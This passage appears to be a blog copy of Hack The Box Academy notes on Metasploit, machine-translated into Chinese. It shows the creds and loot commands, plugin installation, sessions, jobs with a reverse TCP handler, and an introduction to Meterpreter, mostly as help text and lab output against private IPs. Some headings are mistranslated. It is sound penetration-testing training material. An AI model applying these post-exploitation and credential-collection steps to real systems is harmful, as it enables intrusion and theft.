NonReplayableHash</span><br><span class="line">   creds add hash:d19c32489b870735b5f587d76b934283</span><br><span class="line"></span><br><span class="line">General options</span><br><span class="line">  -h,--help             Show this help information</span><br><span class="line">  -o &lt;file&gt;             Send output to a file in csv/jtr (john the ripper) format.</span><br><span class="line">                        If the file name ends in &#x27;.jtr&#x27;, that format will be used.</span><br><span class="line">                        If file name ends in &#x27;.hcat&#x27;, the hashcat format will be used.</span><br><span class="line">                        CSV by default.</span><br><span class="line">  -d,--delete           Delete one or more credentials</span><br><span class="line"></span><br><span class="line">Filter options for listing</span><br><span class="line">  -P,--password &lt;text&gt;  List passwords that match this text</span><br><span class="line">  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec</span><br><span class="line">  -s &lt;svc names&gt;        List creds matching comma-separated service names</span><br><span class="line">  -u,--user &lt;text&gt;      List users that match this text</span><br><span class="line">  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash</span><br><span class="line">  -O,--origins &lt;IP&gt;     List creds that match these origins</span><br><span class="line">  -R,--rhosts           Set RHOSTS from the results of the search</span><br><span class="line">  -v,--verbose          Don&#x27;t truncate long password hashes</span><br><span class="line"></span><br><span class="line">Examples, John the Ripper hash types:</span><br><span class="line">  Operating Systems (starts with)</span><br><span class="line">    Blowfish ($2a$)   : bf</span><br><span class="line">    BSDi     (_)      : bsdi</span><br><span class="line">    DES               : des,crypt</span><br><span class="line">    MD5      ($1$)    : md5</span><br><span class="line">    SHA256   ($5$)    : sha256,crypt</span><br><span class="line">    SHA512   ($6$)    : sha512,crypt</span><br><span class="line">  Databases</span><br><span class="line">    MSSQL             : mssql</span><br><span class="line">    MSSQL 2005        : mssql05</span><br><span class="line">    MSSQL 2012/2014   : mssql12</span><br><span class="line">    MySQL &lt; 4.1       : mysql</span><br><span class="line">    MySQL &gt;= 4.1      : mysql-sha1</span><br><span class="line">    Oracle            : des,oracle</span><br><span class="line">    Oracle 11         : raw-sha1,oracle11</span><br><span class="line">    Oracle 11 (H type): dynamic_1506</span><br><span class="line">    Oracle 12c        : oracle12c</span><br><span class="line">    Postgres          : postgres,raw-md5</span><br><span class="line"></span><br><span class="line">Examples, listing:</span><br><span class="line">  creds               # Default, returns all credentials</span><br><span class="line">  creds 1.2.3.4/24    # Return credentials with logins in this range</span><br><span class="line">  creds -O 1.2.3.4/24 # Return credentials with origins in this range</span><br><span class="line">  creds -p 22-25,445  # nmap port specification</span><br><span class="line">  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services</span><br><span class="line">  creds -t NTLM       # All NTLM creds</span><br><span class="line">  creds -j md5        # All John the Ripper hash type MD5 creds</span><br><span class="line"></span><br><span class="line">Example, deleting:</span><br><span class="line">  # Delete all SMB credentials</span><br><span class="line">  creds -d -s smb</span><br></pre></td></tr></table></figure>

<h2 id="抢劫"><a href="#抢劫" class="headerlink" title="抢劫"></a>抢劫</h2><p>该<code>loot</code>命令与上面的命令结合使用，为您提供拥有的服务和用户的一目了然的列表。在这种情况下，战利品指的是来自不同系统类型的哈希转储，即哈希、密码、影子等。</p>
<h4 id="MSF–-存储战利品"><a href="#MSF–-存储战利品" class="headerlink" title="MSF– 存储战利品"></a>MSF– 存储战利品</h4><p> MSF– 存储战利品</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; loot -h</span><br><span class="line"></span><br><span class="line">Usage: loot [options]</span><br><span class="line"> Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]</span><br><span class="line">  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]</span><br><span class="line">  Del: loot -d [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">  -a,--add          Add loot to the list of addresses, instead of listing</span><br><span class="line">  -d,--delete       Delete *all* loot matching host and type</span><br><span class="line">  -f,--file         File with contents of the loot to add</span><br><span class="line">  -i,--info         Info of the loot to add</span><br><span class="line">  -t &lt;type1,type2&gt;  Search for a list of types</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -S,--search       Search string to filter by</span><br></pre></td></tr></table></figure>

<h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><p>插件是第三方已经发布的现成软件，并已批准 Metasploit 的创建者将他们的软件集成到框架中。这些可以代表免费使用但功能有限的商业产品<code>Community Edition</code>，或者它们可以是由个人开发的个人项目。</p>
<p>插件的使用使渗透测试人员的生活更加轻松，将知名软件的功能带入<code>msfconsole</code>Metasploit Pro 环境。以前，我们需要在不同的软件之间循环导入和导出结果，一遍又一遍地设置选项和参数，现在，通过使用插件，msfconsole 会自动将所有内容记录到我们正在使用的数据库以及主机、服务和漏洞一目了然供用户使用。<a target="_blank" rel="noopener" href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin">插件</a>直接与 API 一起工作，可用于操作整个框架。它们可用于自动执行重复性任务、向 中添加新命令<code>msfconsole</code>以及扩展已经很强大的框架。</p>
<h3 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h3><p>要开始使用插件，我们需要确保它安装在我们机器上的正确目录中。导航到<code>/usr/share/metasploit-framework/plugins</code>，这是每个新安装的默认目录<code>msfconsole</code>，应该向我们展示我们有哪些可用的插件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins</span><br><span class="line"></span><br><span class="line">aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb</span><br><span class="line">alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb</span><br><span class="line">auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb</span><br></pre></td></tr></table></figure>

<p>如果在此处找到该插件，我们可以在内部启动它<code>msfconsole</code>，然后会看到该特定插件的问候输出，表明它已成功加载并可以使用了：</p>
<h3 id="MSF-加载-Nessus"><a href="#MSF-加载-Nessus" class="headerlink" title="MSF - 加载 Nessus"></a>MSF - 加载 Nessus</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load nessus</span><br><span class="line"></span><br><span class="line">[*] Nessus Bridge for Metasploit</span><br><span class="line">[*] Type nessus_help for a command listing</span><br><span class="line">[*] Successfully loaded Plugin: Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; nessus_help</span><br><span class="line"></span><br><span class="line">Command                     Help Text</span><br><span class="line">-------                     ---------</span><br><span class="line">Generic Commands            </span><br><span class="line">-----------------           -----------------</span><br><span class="line">nessus_connect              Connect to a Nessus server</span><br><span class="line">nessus_logout               Logout from the Nessus server</span><br><span class="line">nessus_login                Login into the connected Nessus server with a different username and </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">nessus_user_del             Delete a Nessus User</span><br><span class="line">nessus_user_passwd          Change Nessus Users Password</span><br><span class="line">                            </span><br><span class="line">Policy Commands             </span><br><span class="line">-----------------           -----------------</span><br><span class="line">nessus_policy_list          List all polciies</span><br><span class="line">nessus_policy_del           Delete a policy</span><br></pre></td></tr></table></figure>

<p>如果插件安装不正确，我们将在尝试加载时收到以下错误。</p>
<p> MSF - 加载 Nessus</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load Plugin_That_Does_Not_Exist</span><br><span class="line"></span><br><span class="line">[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb</span><br></pre></td></tr></table></figure>

<p>要开始使用该插件，请开始在该特定插件的帮助菜单中发出我们可用的命令。每个跨平台集成都为我们提供了一组独特的交互，我们可以在评估期间使用这些交互，因此在使用它们之前仔细阅读每一个交互是很有帮助的，这样可以最大限度地利用它们。</p>
<h3 id="安装新插件"><a href="#安装新插件" class="headerlink" title="安装新插件"></a>安装新插件</h3><p>Parrot OS 发行版的每次更新都会安装新的、更受欢迎的插件，因为它们由其制造商向公众推出，收集在 Parrot 更新存储库中。<code>/usr/share/metasploit-framework/plugins</code>要安装未包含在发行版新更新中的新自定义插件，我们可以获取制造商页面上提供的 .rb 文件，并将其放置在具有适当权限的文件夹中。</p>
<p>例如，让我们尝试安装<a target="_blank" rel="noopener" href="https://github.com/darkoperator/Metasploit-Plugins.git">DarkOperator 的 Metasploit-Plugins</a>。然后，按照上面的链接，我们得到几个 Ruby ( <code>.rb</code>) 文件，我们可以直接将它们放在上面提到的文件夹中。</p>
<h3 id="下载-MSF-插件"><a href="#下载-MSF-插件" class="headerlink" title="下载 MSF 插件"></a>下载 MSF 插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins</span><br><span class="line">vnswer77@htb[/htb]$ ls Metasploit-Plugins</span><br><span class="line"></span><br><span class="line">aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb</span><br><span class="line">alias.rb           komand.rb      pentest.rb           thread.rb</span><br><span class="line">auto_add_route.rb  lab.rb         request.rb           token_adduser.rb</span><br><span class="line">beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb</span><br><span class="line">db_credcollect.rb  msfd.rb        sample.rb            twitt.rb</span><br><span class="line">db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb</span><br><span class="line">event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb</span><br><span class="line">ffautoregen.rb     nexpose.rb     socket_logger.rb</span><br><span class="line">growl.rb           openvas.rb     sounds.rb</span><br></pre></td></tr></table></figure>

<p>这里我们可以以插件<code>pentest.rb</code>为例，复制到<code>/usr/share/metasploit-framework/plugins</code>.</p>
<h4 id="MSF-将插件复制到-MSF"><a href="#MSF-将插件复制到-MSF" class="headerlink" title="MSF - 将插件复制到 MSF"></a>MSF - 将插件复制到 MSF</h4><p> MSF - 将插件复制到 MSF</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb</span><br></pre></td></tr></table></figure>

<p>然后，<code>msfconsole</code>通过运行命令启动并检查插件的安装<code>load</code>。加载插件后， at<code>help menu</code>会<code>msfconsole</code>自动扩展附加功能。</p>
<h4 id="MSF-加载插件"><a href="#MSF-加载插件" class="headerlink" title="MSF - 加载插件"></a>MSF - 加载插件</h4><p> MSF - 加载插件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; load pentest</span><br><span class="line"></span><br><span class="line">       ___         _          _     ___ _           _</span><br><span class="line">      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _</span><br><span class="line">      |  _/ -_) &#x27; \  _/ -_|_-&lt;  _| |  _/ | || / _` | | &#x27; \ </span><br><span class="line">      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|</span><br><span class="line">                                              |___/</span><br><span class="line">      </span><br><span class="line">Version 1.6</span><br><span class="line">Pentest Plugin loaded.</span><br><span class="line">by Carlos Perez (carlos_perez[at]darkoperator.com)</span><br><span class="line">[*] Successfully loaded plugin: pentest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; help</span><br><span class="line"></span><br><span class="line">Tradecraft Commands</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">    Command          Description</span><br><span class="line">    -------          -----------</span><br><span class="line">    check_footprint  Checks the possible footprint of a post module on a target system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_exploit Commands</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    show_client_side  Show matched client side exploits from data imported from vuln scanners.</span><br><span class="line">    vuln_exploit      Runs exploits based on data imported from vuln scanners.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Discovery Commands</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Command                 Description</span><br><span class="line">    -------                 -----------</span><br><span class="line">    discover_db             Run discovery modules against current hosts in the database.</span><br><span class="line">    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.</span><br><span class="line">    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.</span><br><span class="line">    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Project Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    project       Command for managing projects.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Postauto Commands</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Command             Description</span><br><span class="line">    -------             -----------</span><br><span class="line">    app_creds           Run application password collection modules against specified sessions.</span><br><span class="line">    get_lhost           List local IP addresses that can be used for LHOST.</span><br><span class="line">    multi_cmd           Run shell command against several sessions</span><br><span class="line">    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.</span><br><span class="line">    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.</span><br><span class="line">    multi_post          Run a post module against specified sessions.</span><br><span class="line">    multi_post_rc       Run resource file with post modules and options against specified sessions.</span><br><span class="line">    sys_creds           Run system password collection modules against specified sessions.</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>许多人为 Metasploit 框架编写了许多不同的插件。它们都有特定的目的，在熟悉它们之后可以极大地帮助我们节省时间。查看下面的流行插件列表：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://nmap.org/">nMap（预装）</a></td>
<td><a target="_blank" rel="noopener" href="https://sectools.org/tool/nexpose/">NexPose（预装）</a></td>
<td><a target="_blank" rel="noopener" href="https://www.tenable.com/products/nessus">Nessus（预装）</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://blog.gentilkiwi.com/mimikatz">Mimikatz（预装 V.1）</a></td>
<td><a target="_blank" rel="noopener" href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi">Stdapi（预装）</a></td>
<td><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation">电磁炮</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb">私人</a></td>
<td><a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/">隐身（预装）</a></td>
<td><a target="_blank" rel="noopener" href="https://github.com/darkoperator/Metasploit-Plugins">黑暗操作员的</a></td>
</tr>
</tbody></table>
<h3 id="混入"><a href="#混入" class="headerlink" title="混入"></a>混入</h3><p>Metasploit 框架是用面向对象的编程语言 Ruby 编写的。<code>msfconsole</code>这在使用起来非常出色方面起着重要作用。Mixin 是其中一种特性，在实现时，它可以为脚本的创建者和用户提供很大的灵活性。</p>
<p>Mixin 是充当其他类使用的方法的类，而不必是其他类的父类。因此，将其称为继承而不是包含被认为是不合适的。它们主要用于我们：</p>
<ol>
<li>想为一个类提供很多可选的功能。</li>
<li>想要为多个类使用一个特定的功能。</li>
</ol>
<p>大多数 Ruby 编程语言都围绕作为模块的 Mixins 展开。Mixins 的概念是使用 word 实现的<code>include</code>，我们将模块名称作为<code>parameter</code>. <a target="_blank" rel="noopener" href="https://en.wikibooks.org/wiki/Metasploit/UsingMixins">我们可以在这里</a>阅读更多关于 mixin 的信息。</p>
<p>如果我们刚刚开始使用 Metasploit，我们不应该担心 Mixins 的使用或它们对我们评估的影响。然而，这里提到它们是为了说明 Metasploit 的定制会变得多么复杂。</p>
<h2 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h2><p>MSFconsole 可以同时管理多个模块。这是它为用户提供如此多灵活性的众多原因之一。这是通过使用 来完成的<code>Sessions</code>，它为您部署的所有模块创建专用的控制接口。</p>
<p>一旦创建了多个会话，我们就可以在它们之间切换并将不同的模块链接到其中一个后台会话以在其上运行或将它们转换为作业。请注意，一旦将会话置于后台，它将继续运行，并且我们与目标主机的连接将持续存在。但是，如果在有效负载运行时出现问题，会话可能会终止，从而导致通信通道中断。</p>
<h2 id="使用会话"><a href="#使用会话" class="headerlink" title="使用会话"></a>使用会话</h2><p>在 msfconsole 中运行任何可用的漏洞利用或辅助模块时，只要它们形成与目标主机的通信通道，我们就可以将会话置于后台。这可以通过按组合键或在 Meterpreter stages 的情况下<code>[CTRL] + [Z]</code>键入命令来完成。<code>background</code>这将提示我们一条确认消息。接受提示后，我们将返回到 msfconsole 提示符 ( <code>msf6 &gt;</code>) 并立即能够启动不同的模块。</p>
<h4 id="列出活动会话"><a href="#列出活动会话" class="headerlink" title="列出活动会话"></a>列出活动会话</h4><p>我们可以使用该<code>sessions</code>命令来查看我们当前活动的会话。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec_psh) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)</span><br></pre></td></tr></table></figure>

<h4 id="与会话交互"><a href="#与会话交互" class="headerlink" title="与会话交互"></a>与会话交互</h4><p>您可以使用该<code>sessions -i [no.]</code>命令打开特定会话。</p>
<p> 与会话交互</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<p>当我们想在一个已经被利用的系统上运行一个额外的模块时，这特别有用，该系统具有形成的、稳定的通信通道。</p>
<p>这可以通过后台处理我们当前的会话来完成，该会话是由于第一个漏洞利用的成功而形成的，搜索我们希望运行的第二个模块，并且，如果所选模块的类型可能，选择会话号该模块应该运行。这可以从第二个模块的菜单中完成<code>show options</code>。</p>
<p>通常，这些模块可以在类别中找到<code>post</code>，指的是 Post-Exploitation 模块。此类别中的主要模块原型包括凭据收集器、本地漏洞利用建议器和内部网络扫描器。</p>
<hr>
<h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>例如，如果我们在特定端口下运行主动攻击并且需要此端口用于不同的模块，我们不能简单地使用终止会话<code>[CTRL] + [C]</code>。如果我们这样做，我们会看到该端口仍在使用中，影响我们对新模块的使用。因此，我们需要使用<code>jobs</code>命令来查看当前在后台运行的活动任务并终止旧任务以释放端口。</p>
<p>会话中的其他类型的任务也可以转换为作业以在后台无缝运行，即使会话终止或消失也是如此。</p>
<h4 id="查看作业命令帮助菜单"><a href="#查看作业命令帮助菜单" class="headerlink" title="查看作业命令帮助菜单"></a>查看作业命令帮助菜单</h4><p>我们可以通过键入 来查看此命令的帮助菜单，就像其他命令一样<code>jobs -h</code>。</p>
<p> 查看作业命令帮助菜单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; jobs -h</span><br><span class="line">Usage: jobs [options]</span><br><span class="line"></span><br><span class="line">Active job manipulation and interaction.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -K        Terminate all running jobs.</span><br><span class="line">    -P        Persist all running jobs on restart.</span><br><span class="line">    -S &lt;opt&gt;  Row search filter.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Lists detailed information about a running job.</span><br><span class="line">    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.</span><br><span class="line">    -l        List all running jobs.</span><br><span class="line">    -p &lt;opt&gt;  Add persistence to job by job ID</span><br><span class="line">    -v        Print more detailed info.  Use with -i and -l</span><br></pre></td></tr></table></figure>

<h4 id="查看漏洞利用命令帮助菜单"><a href="#查看漏洞利用命令帮助菜单" class="headerlink" title="查看漏洞利用命令帮助菜单"></a>查看漏洞利用命令帮助菜单</h4><p>当我们运行 exploit 时，我们可以通过键入<code>exploit -j</code>. 根据命令的帮助菜单<code>exploit</code>，添加<code>-j</code>到我们的命令中。而不仅仅是<code>exploit</code>or <code>run</code>，将“在作业的上下文中运行它”。</p>
<p> 查看漏洞利用命令帮助菜单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit -h</span><br><span class="line">Usage: exploit [options]</span><br><span class="line"></span><br><span class="line">Launches an exploitation attempt.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -J        Force running in the foreground, even if passive.</span><br><span class="line">    -e &lt;opt&gt;  The payload encoder to use.  If none is specified, ENCODER is used.</span><br><span class="line">    -f        Force the exploit to run regardless of the value of MinimumRank.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -j        Run in the context of a job.</span><br><span class="line">	</span><br><span class="line">&lt;SNIP</span><br></pre></td></tr></table></figure>

<h4 id="将漏洞作为后台作业运行"><a href="#将漏洞作为后台作业运行" class="headerlink" title="将漏洞作为后台作业运行"></a>将漏洞作为后台作业运行</h4><p> 将漏洞作为后台作业运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.34:4444</span><br></pre></td></tr></table></figure>

<h4 id="列出正在运行的作业"><a href="#列出正在运行的作业" class="headerlink" title="列出正在运行的作业"></a>列出正在运行的作业</h4><p>要列出所有正在运行的作业，我们可以使用<code>jobs -l</code>命令。要杀死特定的工作，请查看索引号。作业并使用<code>kill [index no.]</code>命令。使用该<code>jobs -K</code>命令终止所有正在运行的作业。</p>
<p> 列出正在运行的作业</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; jobs -l</span><br><span class="line"></span><br><span class="line">Jobs</span><br><span class="line">====</span><br><span class="line"></span><br><span class="line"> Id  Name                    Payload                    Payload opts</span><br><span class="line"> --  ----                    -------                    ------------</span><br><span class="line"> 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444</span><br></pre></td></tr></table></figure>

<p>接下来，我们将使用极其强大的<code>Meterpreter</code>有效负载。</p>
<h1 id="计价器"><a href="#计价器" class="headerlink" title="计价器"></a>计价器</h1><hr>
<p>Payload<code>Meterpreter</code>是一种特定类型的多方面、可扩展的 Payload，用于<code>DLL injection</code>确保与受害主机的连接稳定且难以使用简单检查进行检测，并且可以配置为在重启或系统更改时保持不变。此外，Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。</p>
<p>它被称为渗透测试的瑞士军刀，这是有充分理由的。Meterpreter 的目的是专门改进我们的后开发程序，为我们提供一组精心挑选的相关工具，以便从内部更直接地枚举目标主机。它可以帮助我们找到各种特权升级技术、AV 规避技术、进一步的漏洞研究、提供持久访问、枢轴等。</p>
<p>对于一些有趣的阅读，请查看这篇关于Meterpreter 无阶段有效载荷的<a target="_blank" rel="noopener" href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">文章和这篇关于修改 Metasploit 模板以进行规避的</a><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion">文章</a>。这些主题超出了本模块的范围，但我们应该意识到这些可能性。</p>
<hr>
<h2 id="运行-Meterpreter"><a href="#运行-Meterpreter" class="headerlink" title="运行 Meterpreter"></a>运行 Meterpreter</h2><p>要运行 Meterpreter，我们只需要从输出中选择它的任何版本<code>show payloads</code>，同时考虑到我们正在攻击的连接类型和操作系统。</p>
<p>漏洞利用完成后，会发生以下事件：</p>
<ul>
<li>目标执行初始阶段。这通常是 bind、reverse、findtag、passivex 等。</li>
<li>stager 加载以 Reflective 为前缀的 DLL。反射存根处理 DLL 的加载&#x2F;注入。</li>
<li>Meterpreter 核心初始化，通过套接字建立 AES 加密链接，并发送 GET。Metasploit 收到此 GET 并配置客户端。</li>
<li>最后，Meterpreter 加载扩展。如果模块授予管理权限，它将始终加载<code>stdapi</code>和加载。<code>priv</code>所有这些扩展都是通过 AES 加密加载的。</li>
</ul>
